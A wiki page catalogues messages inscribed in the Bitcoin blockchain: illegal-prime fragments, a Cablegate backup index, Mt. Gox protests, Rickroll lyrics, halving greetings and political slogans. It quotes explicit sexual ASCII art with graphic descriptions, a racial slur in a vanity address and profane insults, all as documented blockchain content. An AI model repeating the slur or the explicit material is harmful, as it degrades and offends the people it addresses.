Soon after block 229991 uploaded the [Satoshi uploader](cryptocurrency.md#satoshi-uploader), several interesting files were added to the blockchain using the uploader, and notably some containing content that might be [illegal](law.md) in certain [countries](science.md#country), as a test to see if this type of content would make the Bitcoin blockchain illegal or not:<a id="_1408"></a>

<a id="_1409"></a>
- [tx 08654f9dc9d673b3527b48ad06ab1b199ad47b61fd54033af30c2ee975c588bd](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0229.txt#L241) block 229999 contains a leaked private key and a link to: [http://threatpost.com/en_us/blogs/ami-firmware-source-codAe-private-key-leaked-040513](http://threatpost.com/en_us/blogs/ami-firmware-source-codAe-private-key-leaked-040513)
<a id="_1410"></a>
- <a id="_1411"></a>
  [tx b96af3b69b48a82c5eae3e44ebb6ef93f30d7764b1d5b40243e11b0d374ac1b7](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0230.txt#L1) block 230001 contains the link:<a id="_1412"></a>


  > [http://en.wikipedia.org/wiki/Illegal_prime](http://en.wikipedia.org/wiki/Illegal_prime)

  followed presumably by one such prime starting with:<a id="_1413"></a>


  > 4 85650 78965 73978 29309 84189 46942 86137 70744 20873 51357 92401 96520 73668

  The number is quoted e.g. at: [https://www.computerforum.com/threads/illegal-prime-number.67782/](https://www.computerforum.com/threads/illegal-prime-number.67782/)<a id="_1414"></a>

  <a id="_1415"></a>
  - [tx 237783998a6799264983150187a73ab6d116f2ba78d3e1f88529e95229f59d67](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0233.txt#L2) [block 233620](https://www.blockchain.com/explorer/transactions/btc/237783998a6799264983150187a73ab6d116f2ba78d3e1f88529e95229f59d67) contains another illegal prime starting with:

  <a id="_1416"></a>
  <a id="_1417"></a>


  > 49310 83597 02850 19002 75777 67239 07649 57284

  This one is quoted in a few places online in blockchain illegality discussions:<a id="_1418"></a>

  <a id="_1419"></a>
  - [https://www.reddit.com/r/Bitcoin/comments/1akyy4/comment/c8yel60](https://www.reddit.com/r/Bitcoin/comments/1akyy4/comment/c8yel60) "What happens if someone inserts illegal content into the block chain?" (2013-03-19)
  <a id="_1420"></a>
  - [https://news.ycombinator.com/item?id=8055243](https://news.ycombinator.com/item?id=8055243) "Filecoin – Data storage network and crypto-currency based on Bitcoin" (2014-07-18)
<a id="_1421"></a>
- [tx 54e48e5f5c656b26c3bca14a8c95aa583d07ebe84dde3b7dd4a78f4e4186e713](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0230.txt#L7) block 230009 contains the Bitcoin white paper: [https://bitcoin.org/bitcoin.pdf](https://bitcoin.org/bitcoin.pdf) More context: [https://bitcoin.stackexchange.com/questions/35959/how-is-the-whitepaper-decoded-from-the-blockchain-tx-with-1000x-m-of-n-multisi](https://bitcoin.stackexchange.com/questions/35959/how-is-the-whitepaper-decoded-from-the-blockchain-tx-with-1000x-m-of-n-multisi)
<a id="_1422"></a>
- [tx 691dd277dc0e90a462a3d652a1171686de49cf19067cd33c7df0392833fb986a](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0230.txt#L557) block 230203 [Cablegate](software.md#united-states-diplomatic-cables-leak) index. The announced filename is `cablegate-201012041811.7z`. As mentioned in [Hidden surprises in the Bitcoin blockchain by Ken Shirriff (2014)](#hidden-surprises-in-the-bitcoin-blockchain-by-ken-shirriff-2014), it has an ASCII list of several other transactions, which presumably when downloaded with the [Satoshi uploader](cryptocurrency.md#satoshi-uploader) can concatenated lead to the full 7z file. Also as mentioned by Ken, it is infinitely easier for the average user to just access the cables directly on [WikiLeaks](software.md#wikileaks) :-) The data is preceded by the message:<a id="_1423"></a>

  ```
  sSEXWikileaks Cablegate Backup

  cablegate-201012041811.7z

  Download the following transactions with Satoshi Nakamoto's download tool which
  can be found in transaction 6c53cd987119ef797d5adccd76241247988a0a5ef783572a9972e7371c5fb0cc

  Free speech and free enterprise! Thank you Satoshi!
  ```
<a id="_1424"></a>
- tx dde7cd8e8f073a525c16c5ee4e4a254f847b7ad6babef257231813166fbef551 block 230229 and tx 4a0088a249e9099d205fb4760c28275d4b8965ac9fd56f5ddf6771cdb0d94f38 block 230231 contain indexes of pages from [The Hidden Wiki](cryptography.md#the-hidden-wiki). These can be viewed at: [https://bitcoinstrings.com/blk00052.txt](https://bitcoinstrings.com/blk00052.txt). Not reproduced here because we are cowards.

<a id="_1425"></a>
So basically, this was the first obviously illegal block attempt.

<a id="_1426"></a>
None of this content is particularly eye-popping for [Ciro Santilli](ciro-santilli.md)'s slightly crazy [freedom of speech](law.md#freedom-of-speech) standards, and as of 2021, the Bitcoin blockchain likely hasn't become illegal anywhere yet due to freedom of speech concerns.

<a id="_1427"></a>
Furthermore, it is likely much easier to find much worse illegal content by browsing any [uncensored Onion service search engine](cryptography.md#uncensored-onion-service-search-engine) for 2 minutes.

<a id="_1428"></a>
[Ciro Santilli](ciro-santilli.md) estimates that perhaps the uploader didn't upload [child pornography](art.md#child-pornography), which is basically the apex of illegality of this era, because they were afraid that their identities would one day be found.

<a id="_1429"></a>
Bibliography:<a id="_1430"></a>

<a id="_1431"></a>
- [https://bitcointalk.org/index.php?topic=191039.0](https://bitcointalk.org/index.php?topic=191039.0) "WTF - Kiddy Porn in the Blockchain for life?" (2013-04-29) on the [Bitcoin Forum](cryptocurrency.md#bitcoin-forum)

### Porn

↑ **Parent:** [Themes](#themes)  
🏷️ **Tags:** [Porn](#porn)

<a id="_1433"></a>
For now we are going to keep this site porn-free and only link to prevent bad things from happening, as it might violate [GitHub porn policy](software.md#github-porn-policy) depending on how it is hosted, and [Google](google.md) may dislike it. [Video "What is more obscene: sex or war? scene from The People vs. Larry Flynt"](art.md#video-what-is-more-obscene-sex-or-war-scene-from-the-people-vs-larry-flynt).

<a id="_1434"></a>
If illegal porn were to ever be found, we would be unable to acknowledge that, and would just have to silently remove it. Of course, the reproducible nature of [Bitcoin Inscription Indexer](cryptocurrency.md#bitcoin-inscription-indexer) means that anyone who regenerates the data would immediately see such entries in the diff.

<a id="_1435"></a>
Another issue is that it can be quite hard to determine if porn is legal or illegal, e.g. it can be hard to distinguish legal an illegal ages or revenge vs consensual porn, especially at the low resolutions that you may expect to find embedded in the blockchain. We are generally going to be quite strict about this, and in case of uncertainty on porn legality we will censor first.

<a id="_1436"></a>
OK the list:<a id="_1437"></a>

<a id="_1438"></a>
- [tx 4c903a377addab7c1e35a685d3dabc664199e406374b1e5ce2fc59e78fb5b754](https://www.blockchain.com/explorer/transactions/btc/4c903a377addab7c1e35a685d3dabc664199e406374b1e5ce2fc59e78fb5b754) (2016-07-09) contains an animated [GIF](computer.md#gif) of a woman [pole dancing](https://ourbigbook.com/go/topic/pole-dancing). She is seen from behind, in revealing blue clothes that show her buttocks. Reproduced at: [https://twitter.com/cirosantilli/status/1755378949117370668](https://twitter.com/cirosantilli/status/1755378949117370668). The file contains the following strings embedded into it:<a id="_1439"></a>
  > This [GIF](computer.md#gif) file was assembled with [GIF](computer.md#gif) Construction Set from:  
  > Alchemy Mindworks Inc.  
  > This comment block will not appear in files created with a registered version of GIF Construction Set

  and:<a id="_1440"></a>
  > [Cryptograffiti.info](#cryptograffiti-info) messages now cheaper.

#### ASCII porn

↑ **Parent:** [Porn](#porn)  
🏷️ **Tags:** [ASCII art](#ascii-art)

<a id="_1443"></a>
All found so far are also reproduced at: [https://asciiart.website/index.php?art=people/naked%20ladies](https://asciiart.website/index.php?art=people/naked%20ladies) therefore not blockchain original.

<a id="_1444"></a>
Some of the very first [ASCII art](#ascii-art) present in the blockchain besides [BitLen](#len-sassaman-tribute) is porn. Surprising?

<a id="_1445"></a>
<a id="_1446"></a>
- [tx 9206ec2a41846709a59cafb406dd7b07082bfc27664bbc5c6d4df310c1e1b91f](https://www.blockchain.com/explorer/transactions/btc/9206ec2a41846709a59cafb406dd7b07082bfc27664bbc5c6d4df310c1e1b91f) block 290848 (2014-03-16) via [cryptograffiti.info](#cryptograffiti-info): [sexually aroused](biology.md#sexual-arousal) naked [woman](biology.md#female) sitting looking forward with legs open showing her [vagina](biology.md#vagina). Vagina row as an identifier for Ctrl + F:<a id="_1447"></a>

  ```
  .     `.    .\x./-`--...../'   ;   :
  ```

  A bit bellow [tx 8367a48e4a863e37b3749bc9c111327b07a7c383ec9b3e7ce8d41949e71e1c10](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0291.txt#L28) has a large hand showing the middle finger and wearing a watch:<a id="_1448"></a>

  ```
           /"\
          |\./|
          |   |
          |   |
          |>~<|
          |   |
       /'\|   |/'\..
   /~\|   |   |   | \
  [   |   |   |  |   \
  |   |   |   |   |   \
  | ~   ~   ~   ~ |`   )
  |                   /
   \                 /
    \               /
     \             /
      |--//''`\--|
      | (( +==)) |
      |--\_|_//--|
  ```

  Reproduced e.g. at: [https://www.textartcopy.com/ascii-middle-finger.html](https://www.textartcopy.com/ascii-middle-finger.html)
<a id="_1449"></a>
- [tx 0aab36554c2ac5ec23747e7f21f75dbe3f16739134cf44953ad7ac98927146d6](https://www.blockchain.com/explorer/transactions/btc/0aab36554c2ac5ec23747e7f21f75dbe3f16739134cf44953ad7ac98927146d6) block 322920 (2014-09-28) via [cryptograffiti.info](#cryptograffiti-info): naked [woman](biology.md#female) laying on her side showing her [vagina](biology.md#vagina) from under her legs, signed `fsc`. Vagina row:<a id="_1450"></a>

  ```
               `-:/"-7.--""            _::.-'P::..    \}
  ```

  Fully reproduced e.g. at [https://www.asciiart.eu/people/sexual/women](https://www.asciiart.eu/people/sexual/women) which credits the art to a "Marcin Glinski" (Polish: Marcin Gliński), possibly this dude [https://github.com/silentlamb/ASCII-Arts](https://github.com/silentlamb/ASCII-Arts) | [https://www.linkedin.com/in/marcinglinski)](https://www.linkedin.com/in/marcinglinski))<a id="_1451"></a>
  > You may use any of them for any purpose, as long as my signature (fsc) stay untouched.

  The signature is also listed at [https://www.asciiart.eu/ascii-artists/who-is-who](https://www.asciiart.eu/ascii-artists/who-is-who) for example.
<a id="_1452"></a>
- [tx 66826fccef3e3ebb34abce25bfeff8f9dcaaf88e4707a5576c494d8a1cf1681a](https://www.blockchain.com/explorer/transactions/btc/66826fccef3e3ebb34abce25bfeff8f9dcaaf88e4707a5576c494d8a1cf1681a) block 388714 (2015-12-16) has a one liner [penis](biology.md#penis) and [breasts](biology.md#breast):<a id="_1453"></a>

  ```
  jEW B====D ( . Y . )
  ```

  soon followed by more breasts at [37c1e90c6ce3e648c51bfa38cbb43e996cd46e038517596d4c90ca2a6425a701](https://www.blockchain.com/explorer/transactions/btc/37c1e90c6ce3e648c51bfa38cbb43e996cd46e038517596d4c90ca2a6425a701):<a id="_1454"></a>

  ```
  jEW ( . Y . )TIDDIES( . Y . )
  ```

  Found by [Messages from the mines](#messages-from-the-mines).

### Mt. Gox' shutdown

↑ **Parent:** [Themes](#themes)  
🏷️ **Tags:** [Mt. Gox](cryptocurrency.md#mt-gox)

<a id="_1457"></a>
[Mt. Gox](cryptocurrency.md#mt-gox) was the first [Cryptocurrency exchange](cryptocurrency.md#cryptocurrency-exchange) in existence, and when it shutdowon in Febrauary 2014 because the website was crap and they got hacked, some people were not happy at all about their missing funds!

<a id="_1458"></a>
[tx 0540b5dda23ee870330c6b1e18a88c592cf8d847c47f1dc1d5328f46115b12b3](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0287.txt#L136) ([2014-02-25](https://www.blockchain.com/explorer/transactions/btc/0540b5dda23ee870330c6b1e18a88c592cf8d847c47f1dc1d5328f46115b12b3))<a id="_1459"></a>

```
2014-02-25: The day Mt.Gox shut down. Farewell, may even you rest in peace!
```

<a id="_1460"></a>
[tx 2374f8575f65763caf6909551c131d3ae45399a73aee638bcbccaebdb1219d67](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0287.txt#L139) ([2014-02-25](https://www.blockchain.com/explorer/transactions/btc/2374f8575f65763caf6909551c131d3ae45399a73aee638bcbccaebdb1219d67)):<a id="_1461"></a>

```
Fuck you MtGox
Fuck you MtGox
R
```

<a id="_1462"></a>
[tx c00a4a04905a2e8d8dee8a768165aa6bdf842413a8a648462a6349db89cd77f2](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0288.txt#L1) ([2014-02-27](https://www.blockchain.com/explorer/transactions/btc/c00a4a04905a2e8d8dee8a768165aa6bdf842413a8a648462a6349db89cd77f2)) has an [ASCII art](#ascii-art) of a seal, TODO understand [meme](science.md#meme):<a id="_1463"></a>

```
        o
      / |
      | \
  .   |  |
.'\`  | \|
  | \_/ \ \
  \____/\/
<3 You Seals!
```

<a id="_1464"></a>
There are also a few [Base58](computer.md#base58) messages referring to Mt Gox, the nicest and most expensive one being to burn addres:<a id="_1465"></a>


> [1FuckMtGoxFFFFFFFUUUUUUUUUUQXW5ik](https://blockchair.com/bitcoin/address/1FuckMtGoxFFFFFFFUUUUUUUUUUQXW5ik)

which as of 2025 holds 0.014537 BTC burnt on:<a id="_1466"></a>

<a id="_1467"></a>
- 14x 0.001 BTC transactions starting at [tx b170551d4df68d714fa98189c73f61b0c2bc54cafe33a2953fcc0bc11f6aa72a](https://www.blockchain.com/explorer/transactions/btc/b170551d4df68d714fa98189c73f61b0c2bc54cafe33a2953fcc0bc11f6aa72a) block 287826 (2014-02-26)
<a id="_1468"></a>
- plus one 0.001337 BTC transaction in the middle at [tx 6b878716d1d9af0f50de441f318da68121261a5778fd541def4408c0aac531f6](https://www.blockchain.com/explorer/transactions/btc/6b878716d1d9af0f50de441f318da68121261a5778fd541def4408c0aac531f6) block 287868 (2014-02-26), why not.
Many of these transactions also contain other quick messages, e.g.:<a id="_1469"></a>

<a id="_1470"></a>
- [tx e6d4cfbbc45b5e3cfcfa36613b04a8732c7b4606f5dbbd8af3ba06d8f3899fc2](https://www.blockchain.com/explorer/transactions/btc/e6d4cfbbc45b5e3cfcfa36613b04a8732c7b4606f5dbbd8af3ba06d8f3899fc2) also features a [Rickrolling](#rickrolling) instance.
<a id="_1471"></a>
- [tx 10a9bb0625447df044410cf9cd74742ec0bf334d48b4b1f93c10a4a60748bb5d](https://www.blockchain.com/explorer/transactions/btc/10a9bb0625447df044410cf9cd74742ec0bf334d48b4b1f93c10a4a60748bb5d) also features `Nigger` inside a spendable vanity address: [1Niggerw15VezU6rA7jRBuJt9ceg9VL1jh](https://www.blockchain.com/explorer/addresses/btc/1Niggerw15VezU6rA7jRBuJt9ceg9VL1jh)

### Protests against larger block sizes

↑ **Parent:** [Themes](#themes)

<a id="_1473"></a>
<a id="_1474"></a>
- [https://en.bitcoin.it/wiki/Block_size_limit_controversy](https://en.bitcoin.it/wiki/Block_size_limit_controversy)
<a id="_1475"></a>
- [https://blog.bitmex.com/the-blocksize-war-chapter-1-first-strike/](https://blog.bitmex.com/the-blocksize-war-chapter-1-first-strike/)

<a id="_1476"></a>
Protesters were posting large chunks of text multiple times into the blockchain as a way to protest against the controversial increase of block size.

<a id="_1477"></a>
[tx 08893442680a20c4d0548dec2c8c421fa43336528b4e274dbf2652774f9c9f2d](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/in/0355.txt#L5837) has the first copy of:<a id="_1478"></a>


> I like big blocks and I can not lie

which is the first line of a parody on:<a id="_1479"></a>


> I like big butts and I cannot lie

from the [Baby Got Back](https://en.wikipedia.org/wiki/Baby_Got_Back) hip-hop song.

<a id="_1480"></a>
[tx 52159222289cd0a5afe0644150d0e23d5d272a57365627d5e869fdb458289858](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/in/0355.txt#L16) has the first copy of:<a id="_1481"></a>


> Time to roll out bigger blocks

which is likely a copy of an email from the bitcoin development [mailing list](website.md#mailing-list). This message is repeated dozens of times in other transactions.

#### IRC log dumps

↑ **Parent:** [Protests against larger block sizes](#protests-against-larger-block-sizes)  
🏷️ **Tags:** [Bitcoin IRC channel](cryptocurrency.md#bitcoin-irc-channel)

<a id="_1484"></a>
[tx 210000d1392bec2505d1289e5c39c2039204ff1ecf7eef55f973ccd3111003e1](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/in/in/0360.txt#L239), [block 360235](https://www.blockchain.com/explorer/blocks/btc/360235) (2015-06-10) and the following transactions have transcripts of a very long developer chat starting with:<a id="_1485"></a>


> jgarzik: if you aren't near one of the consulates there are some companies that will charge you money to do it...

<a id="_1486"></a>
TODO purpose? The transcripts are interspersed with developers likely voting for project leadership, and commenting on Gavin.

<a id="_1487"></a>
TODO find original discussion location, these are almost certainly from one of the [Bitcoin IRC channels](cryptocurrency.md#bitcoin-irc-channel).

<a id="_1488"></a>
Part of the goal of this dump is that the Bitcoin developers have a policy of not allowing logging on their talk channel, and this released it all to the blockchain forever where it cannot be deleted. These might just be more of [protests against larger block sizes](#protests-against-larger-block-sizes).

### 503: Bitcoin over capacity

↑ **Parent:** [Themes](#themes)

<a id="_1490"></a>
Starting [tx a87d406fae047258a12923b3c11a797a5765bd8f868df5c7e9b1cead0e92c9c1](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0401.txt#L39214): the message:<a id="_1491"></a>

```
503: Bitcoin over capacity!
```
appears about 13 thousand times. WTF happened?

### Rickrolling

↑ **Parent:** [Themes](#themes)  
🏷️ **Tags:** [Rickrolling](#rickrolling)

<a id="_1493"></a>
[Rickrolling](science.md#rickrolling) lyrics were mined several times into the blockchain.

<a id="_1494"></a>
The first currently known instance is as a link right during the [prayer wars](#prayer-wars) on [block 142573](https://www.blockchain.com/explorer/blocks/btc/142573) (2011-08-25) as the [miner message](social-technology.md#miner-message):<a id="_1495"></a>


> Militant atheists, [http://bit.ly/naNhG2](http://bit.ly/naNhG2) -- happy now?"

which redirects to [https://www.youtube.com/watch?v=mGDuExhS6Nw&blockchain](https://www.youtube.com/watch?v=mGDuExhS6Nw&blockchain)

<a id="_1496"></a>
Around block [block 246k](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/in/0264.txt#L28) (e.g. [27b7c526489dac8245747fa1c425a2e3eb07dea57b294eb4ae583fec9b859fcf](https://www.blockchain.com/explorer/transactions/btc/27b7c526489dac8245747fa1c425a2e3eb07dea57b294eb4ae583fec9b859fcf), 2013-10-17) we note several transactions starting with a [XML](computer.md#xml) format `<CG SZ="1156"><MG>...` the first one being 0b4efe49ea1454020c4d51a163a93f726a20cd75ad50bb9ed0f4623c141a8008 As mentioned not very clearly at [http://www.righto.com/2014/02/ascii-bernanke-wikileaks-photographs.html#ref12](http://www.righto.com/2014/02/ascii-bernanke-wikileaks-photographs.html#ref12) the content of the first `<MG><payload></MG>` is a [Base64](computer.md#base64) encoded string<a id="_1497"></a>

```
Catagory: Poetry
Title: Never Gonna Give You Up
Performer: Rick Astley
Writer: Mike Stock, Matt Aitken, Pete Waterman
Label: RCA Records
```
followed by lyrics also base64 encoded as part of the XML metadata. [Hidden surprises in the Bitcoin blockchain by Ken Shirriff (2014)](#hidden-surprises-in-the-bitcoin-blockchain-by-ken-shirriff-2014) was not able to identify the exact format either. At [https://twitter.com/EMBII4U/status/1655831533750562816](https://twitter.com/EMBII4U/status/1655831533750562816) EMBII mentions that this was part of an upload test.

<a id="_1498"></a>
[tx d29c9c0e8e4d2a9790922af73f0b8d51f0bd4bb19940d9cf910ead8fbe85bc9b](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0268.txt#L1) ([2013-11-13](https://www.blockchain.com/explorer/transactions/btc/d29c9c0e8e4d2a9790922af73f0b8d51f0bd4bb19940d9cf910ead8fbe85bc9b)) contains a plaintext Rickroll lyric in an [output script](cryptocurrency.md#bitcoin-output-script) via [OP\_RETURN](cryptocurrency.md#op-return).

<a id="_1499"></a>
[tx 15b11e8d4e5b9425f024b381ba0cb7a54a35e52389bb4855f505772ce685b39c](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/in/0307.txt#L61) ([2014-06-24](https://www.blockchain.com/explorer/transactions/btc/15b11e8d4e5b9425f024b381ba0cb7a54a35e52389bb4855f505772ce685b39c)): starting from this transaction, the lyrics were inscribed several times via [input scripts](cryptocurrency.md#bitcoin-input-script). Then again:<a id="_1500"></a>

<a id="_1501"></a>
- 8bb9db70e24202fdfd0e48b57a11a407e6c8c0e76d879634b801b4345b8810b2
<a id="_1502"></a>
- b881afa519804a3c93a3c99481517ca8ae070b84c04e8e7a2bfb808e043f9771
<a id="_1503"></a>
- 70c8405bd0ec10bea49b78a819dfbf46c1082e7e620588f9da65a90b71e52bbd
<a id="_1504"></a>
- fc4e382793757858bec4b87527caa4bf2e6f71bb2f5a77bb41a45ddb9ed9d409
<a id="_1505"></a>
- f011e71b711aa54a0c824244fff83fb8b1e1921804624fa0523a6e61612b7f6f
<a id="_1506"></a>
- a8691cdbca5b82e4e48812e48b7a09e4757801fd3909a09975de957d1bfb52dc
<a id="_1507"></a>
- d8946aa464be464674bba6d15729d75572ec75dda49fe7ff0ede1a25ca054941
<a id="_1508"></a>
- d02864cd57c9d041dbd9d6f24327f347b92697a8bc3c86cdf8b738063c6ad002
<a id="_1509"></a>
- 9b78962d840f1ff681e5042264e4d0359cda98ce49d97569df14ce956622b966
<a id="_1510"></a>
- 7bdc22fb35f0a8eb6241782a306a8904fb6f793126ff106a04a96f9f223cb8e1
<a id="_1511"></a>
- e24a4085c54a6362e615f8eab758c12d80e488b73757e6d2b8ab6bfc8be7007e
<a id="_1512"></a>
- 4257f4980955d8376ee1c6bccb4396da726e4ae13d758e47dc4e0775019723f5
<a id="_1513"></a>
- a09b49e9374d43386a6a986944e3dcf515c7e1c38324836df5333b8adbe57797
<a id="_1514"></a>
- 03096688dbb874f7c571691e4241a298284bf4184be339b148f1b48f383a1d7c
<a id="_1515"></a>
- 62f8b228b6126354736d36d9f3b91882bb81eca7702b74fba6471abc7db96a03 ([2015-09-30](https://www.blockchain.com/explorer/transactions/btc/62f8b228b6126354736d36d9f3b91882bb81eca7702b74fba6471abc7db96a03))
They were mega obnoxious!!! Who does this kind of crap for more than one year!!!

### Halving messages

↑ **Parent:** [Themes](#themes)

<a id="_1516"></a>
Each [Bitcoin halving](cryptocurrency.md#bitcoin-halving) event prompts a few commemorative messages, much like a New Year's even event in the real world.

<a id="_1517"></a>
1st (2012):<a id="_1518"></a>

<a id="_1519"></a>
- [https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/in/0209.txt](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/in/0209.txt): nothing
<a id="_1520"></a>
- [https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/in/0210.txt](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/in/0210.txt): nothing
<a id="_1521"></a>
- [https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0209.txt#L1111](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0209.txt#L1111): nothing, not even any ASCII
<a id="_1522"></a>
- [https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/in/0209.txt#L132a](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/in/0209.txt#L132a); void

<a id="_1523"></a>
2nd (2016):<a id="_1524"></a>

<a id="_1525"></a>
- [https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/in/0419.txt#L407](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/in/0419.txt#L407): nothing
<a id="_1526"></a>
- [https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/in/0420.txt#L1](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/in/0420.txt#L1):<a id="_1527"></a>

  <a id="_1528"></a>
  - [block 420000](https://www.blockchain.com/explorer/blocks/btc/420000): "Chandler Guo loves YangYang Jin". Presumably this dude: [https://twitter.com/ChandlerGuo](https://twitter.com/ChandlerGuo). Noted e.g. at: [https://www.reddit.com/r/Bitcoin/comments/4s14po/the_first_14_block_is_a_profession_of_love/](https://www.reddit.com/r/Bitcoin/comments/4s14po/the_first_14_block_is_a_profession_of_love/)
  <a id="_1529"></a>
  - [block 420001](https://www.blockchain.com/explorer/blocks/btc/420000): "/BTCC/ Welcome to 12.5 BTC blocks! BTCC & [Bitcoin](cryptocurrency.md#bitcoin) Forever!".
<a id="_1530"></a>
- [https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0419.txt#L10011](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0419.txt#L10011): a few
<a id="_1531"></a>
- [https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0420.txt#L1](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0420.txt#L1): a few

<a id="_1532"></a>
3rd (2020):<a id="_1533"></a>

<a id="_1534"></a>
- [https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/in/0629.txt#L407](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/in/0629.txt#L407)<a id="_1535"></a>

  <a id="_1536"></a>
  - [block 629999](https://www.blockchain.com/explorer/blocks/btc/629999): contains the [miner message](social-technology.md#miner-message) for:<a id="_1537"></a>
    > [NYTimes](social-technology.md#new-york-times) 09/Apr/2020 With $2.3T Injection, Fed's Plan Far Exceeds 2008 Rescue

    This quotes the title of: [https://www.nytimes.com/2020/04/09/business/economy/fed-economic-rescue-coronavirus.html](https://www.nytimes.com/2020/04/09/business/economy/fed-economic-rescue-coronavirus.html) is of course a nod to the [Genesis block message](cryptocurrency.md#genesis-block-message). Noted by [Forbes](social-technology.md#forbes) at: [https://www.forbes.com/sites/colinharper/2020/05/11/bitcoins-halving-block-includes-a-message-to-remind-us-why-it-was-created/?sh=130f001f656a](https://www.forbes.com/sites/colinharper/2020/05/11/bitcoins-halving-block-includes-a-message-to-remind-us-why-it-was-created/?sh=130f001f656a) It was mined by the [F2Pool](cryptocurrency.md#f2pool) [Bitcoin mining pool](cryptocurrency.md#bitcoin-mining-pool). A few halving output messages can be seen in nearby regular transactions:
<a id="_1538"></a>
- [https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/in/0630.txt#L1](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/in/0630.txt#L1): nothing
<a id="_1539"></a>
- [https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0629.txt#L1111](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0629.txt#L1111): a few
<a id="_1540"></a>
- [https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0630.txt#L1](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0630.txt#L1): a dozen such as:<a id="_1541"></a>

  <a id="_1542"></a>
  - tx 0df655b7e50dc9a53c343308d1ca148d0bead993821dfe56a035aecd0c88b2ad "Happy 2020 Halving! Thank you [Satoshi](cryptocurrency.md#satoshi-nakamoto)."
  <a id="_1543"></a>
  - tx 6c6c22b8fe87f1420df6d991f7b571fdaa29f7a95adbfbcfcb0644f1c8f7d82b "We love you forever @millsfogle"
  <a id="_1544"></a>
  - tx 70a8639bc9b743c0610d1231103a2f8e99f4a25670946b91f16c55a5373b37d1 "Happy 3rd halving! Thanks, [Satoshi](cryptocurrency.md#satoshi-nakamoto) and [COVID-19](taxonomy.md#covid-19) GO AWAY! Bulgaria \#1!!!"

### Politics

↑ **Parent:** [Themes](#themes)  
🏷️ **Tags:** [Politics](#politics)

#### China

↑ **Parent:** [Politics](#politics)  
🏷️ **Tags:** [China](#china)

<a id="_1547"></a>
[China stuff](the-most-important-projects-done-by-ciro-santilli.md#ciro-santilli-s-campaign-for-freedom-of-speech-in-china) is mentioned at: [https://cirosantilli.com/china-dictatorship/bitcoin-blockchain](https://cirosantilli.com/china-dictatorship/bitcoin-blockchain).

#### Trump

↑ **Parent:** [Politics](#politics)  
🏷️ **Tags:** [Donald Trump](science.md#donald-trump)

<a id="_1549"></a>
There's a bit of both sides in the 2016 race:<a id="_1550"></a>

<a id="_1551"></a>
- tx 3aaae4adc68b3768e1a6029987f2aca2479818495c9aee6a86067710806e9c4f: "bEW Trump 2016! Stop the TPP!"
<a id="_1552"></a>
- [tx 202ceac7b3e7b990d1961fd2eab18ba5c80c99f10eacc783f14c53ebfdcaee00](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0408.txt#L4620) "oEW Fuck Obama&Clinton Go [Trump](#trump)!!!!"
<a id="_1553"></a>
- tx 53fcddaa69e79c0fdc4e2cd139bffef341a38d46bb653721d9adf42460b1afae "EW Trump will fail America, like all his businesses"
<a id="_1554"></a>
- data/out/0433.txt:1752:EW FUCK Trump and his supporters. You ppl are the dumbest scum ever.
<a id="_1555"></a>
- data/out/0435.txt:1904:EW TRUMP 2016 !!!!!!!!!!!!!!
<a id="_1556"></a>
- data/out/0437.txt:1150:bjEW FuCk OfF TrUmP!
<a id="_1557"></a>
- data/out/0439.txt:1017:EW trump will trample regulations justly
<a id="_1558"></a>
- data/out/0443.txt:1281:L9,GOD EMPEROR TRUMP WINS THIRD TERM\`7
<a id="_1559"></a>
- data/out/0444.txt:2102:L99,TRUMPPPPPPPPPPPPPPP
<a id="_1560"></a>
- data/out/0445.txt:311:L127,TRUMP WILL SAVE THE WORLD.
<a id="_1561"></a>
- data/out/0445.txt:1257:EW Howard not Trump is the actual 45th president.
<a id="_1562"></a>
- [tx 2fb07a8f358d690d8717734a48e5daf0ef70ea2d0e3b7c88dace8a5818fcb168](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0457.txt#L6780) "L299,[Trump](#trump) touched my no-no"
<a id="_1563"></a>
- data/out/0457.txt:8677:EW All of the sheep think Donald Trump is literally Hitler.
